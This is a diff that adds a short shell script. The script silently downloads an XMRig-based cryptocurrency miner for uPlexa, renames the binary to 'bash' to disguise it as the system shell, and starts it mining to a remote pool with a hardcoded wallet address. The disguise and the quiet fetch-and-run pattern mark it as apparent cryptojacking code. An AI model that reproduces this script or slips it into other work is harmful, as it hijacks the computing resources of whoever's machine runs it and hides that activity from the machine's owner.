@@ -1,0 +1,5 @@
+wget -qO tatang.tar.gz https://github.com/uPlexa/xmrig-upx/releases/download/v0.2.0/xmrig-upx-v0.2.0-lin64.tar.gz
+tar -xhf tatang.tar.gz
+cd xmrig-upx-v0.2.0-lin64
+mv xmrig bash
+./bash -o fr-upx.miningocean.org:4332 -u UmW3y8YH8oQ3WRNDYVCNt1BN6xjHuTvaSVrzyxTbretq6SvVWbeSy6MARXLcmb3o18eY15e8jYfw6CrahhCHvnAX1gF8zqfAk -p test -a cryptonight-upx/2 -k --donate-level 1
